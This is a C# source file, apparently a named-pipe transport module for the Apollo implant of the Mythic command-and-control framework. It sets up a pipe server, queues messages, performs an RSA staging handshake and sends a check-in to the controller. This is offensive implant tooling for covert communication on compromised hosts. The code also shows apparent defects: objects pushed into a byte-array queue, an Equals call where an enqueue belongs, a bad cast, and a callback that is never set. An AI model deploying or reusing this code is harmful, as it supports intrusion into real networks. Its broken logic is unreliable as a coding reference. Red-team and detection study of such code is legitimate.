using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using ApolloInterop.Interfaces;
using ApolloInterop.Classes;
using System.IO.Pipes;
using ApolloInterop.Structs.MythicStructs;
using ApolloInterop.Types.Delegates;
using System.Runtime.Serialization.Formatters.Binary;
using ApolloInterop.Structs.ApolloStructs;
using System.Collections.Concurrent;
using ApolloInterop.Enums.ApolloEnums;
using System.Threading;

namespace NamedPipeTransport
{
    public class NamedPipeProfile : C2Profile, IC2Profile, INamedPipeCallback
    {
        private string _namedPipeName;
        private AsyncNamedPipeServer _server;
        private INamedPipeCallback _callback;
        private bool _encryptedExchangeCheck;
        private const int _SERVER_SEND_SIZE = 30000;
        private const int _SERVER_RECV_SIZE = 30000;
        List<PipeStream> _pipes = new List<PipeStream>();
        private ConcurrentQueue<byte[]> _senderQueue = new ConcurrentQueue<byte[]>();
        private ConcurrentQueue<IMythicMessage> _recieverQueue = new ConcurrentQueue<IMythicMessage>();
        private BinaryFormatter _bf;


        ConcurrentDictionary<string, IPCMessageStore> _messageOrganizer = new ConcurrentDictionary<string, IPCMessageStore>();
        public NamedPipeProfile(Dictionary<string, string> data, ISerializer serializer, IAgent agent) : base(data, serializer, agent)
        {
            _namedPipeName = data["pipename"];
            _encryptedExchangeCheck = data["encrypted_exchange_check"] == "T";
            _bf = new BinaryFormatter();
            _bf.Binder = new IPCMessageBinder();
        }

        public void OnAsyncConnect(PipeStream pipe, out Object state)
        {
            _pipes.Add(pipe);
            Connected = true;
            state = this;
        }

        public void OnAsyncDisconnect(PipeStream pipe, Object state)
        {
            _pipes.Remove(pipe);
        }

        public void OnAsyncMessageReceived(PipeStream pipe, IPCData data, Object state)
        {
            lock(_messageOrganizer)
            {
                if (!_messageOrganizer.ContainsKey(data.ID))
                {
                    _messageOrganizer[data.ID] = new IPCMessageStore(DeserializeToReceiverQueue);
                }
            }
            _messageOrganizer[data.ID].AddMessage(data);
            if (_senderQueue.TryDequeue(out byte[] result))
            {
                pipe.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, pipe);
            }
        }

        private void OnAsyncMessageSent(IAsyncResult result)
        {
            PipeStream pipe = (PipeStream)result;
            pipe.EndWrite(result);
            if (_senderQueue.TryDequeue(out byte[] data))
            {
                pipe.BeginWrite(data, 0, data.Length, OnAsyncMessageSent, pipe);
            }
        }

        private bool AddToSenderQueue(IMythicMessage msg)
        {
            IPCData[] parts = Serializer.SerializeIPCMessage(msg, _SERVER_SEND_SIZE - 1000);
            foreach(IPCData part in parts)
            {
                _senderQueue.Enqueue(Encoding.UTF8.GetBytes(Serializer.Serialize(part)));
            }
            return true;
        }

        public bool DeserializeToReceiverQueue(byte[] data, MessageType mt)
        {
            IMythicMessage msg = Serializer.DeserializeIPCMessage(data, mt);
            Console.WriteLine("We got a message: {0}", mt.ToString());
            _recieverQueue.Equals(msg);
            return true;
        }

        public bool Connect()
        {
            return true;
        }


        public bool Recv(MessageType mt, OnResponse<IMythicMessage> onResp)
        {
            while (true)
            {
                IMythicMessage msg = _recieverQueue.SingleOrDefault(m => m.GetTypeCode() == mt);
                if (msg != null)
                {
                    _recieverQueue = new ConcurrentQueue<IMythicMessage>(_recieverQueue.Where(m => m != msg));
                    return onResp(msg);
                } else
                {
                    Thread.Sleep(100);
                }
            }
        }

        // I think we need to change the IC2Profile interface.
        public bool Recv<T>(OnResponse<T> onResponse)
        {
            throw new NotImplementedException("NamedPipeProfile does not implement generic type receiving.");
        }

        public bool Connect(CheckinMessage checkinMsg, OnResponse<MessageResponse> onResp)
        {
            if (_server == null)
            {
                _server = new AsyncNamedPipeServer(_namedPipeName, _callback, null, 1, _SERVER_SEND_SIZE, _SERVER_RECV_SIZE);
            }

            if (_encryptedExchangeCheck)
            {
                var rsa = Agent.GetApi().NewRSAKeyPair(4096);
                EKEHandshakeMessage handshake1 = new EKEHandshakeMessage()
                {
                    Action = "staging_rsa",
                    PublicKey = rsa.ExportPublicKey(),
                    SessionID = rsa.SessionId
                };
                _senderQueue.Enqueue(handshake1);
                if (!Recv(MessageType.EKEHandshakeResponse, delegate(IMythicMessage resp)
                {
                    EKEHandshakeResponse respHandshake = (EKEHandshakeResponse)resp;
                    byte[] tmpKey = rsa.RSA.Decrypt(Convert.FromBase64String(respHandshake.SessionKey), true);
                    ((ICryptographySerializer)Serializer).UpdateKey(Convert.ToBase64String(tmpKey));
                    ((ICryptographySerializer)Serializer).UpdateUUID(respHandshake.UUID);
                    return true;
                }))
                {
                    return false;
                }
            }
            _senderQueue.Enqueue(checkinMsg);
            return Recv(MessageType.MessageResponse, delegate (IMythicMessage resp)
            {
                MessageResponse mResp = (MessageResponse)resp;
                Connected = true;
                ((ICryptographySerializer)Serializer).UpdateUUID(mResp.ID);
                return onResp(mResp);
            });
        }
    }
}
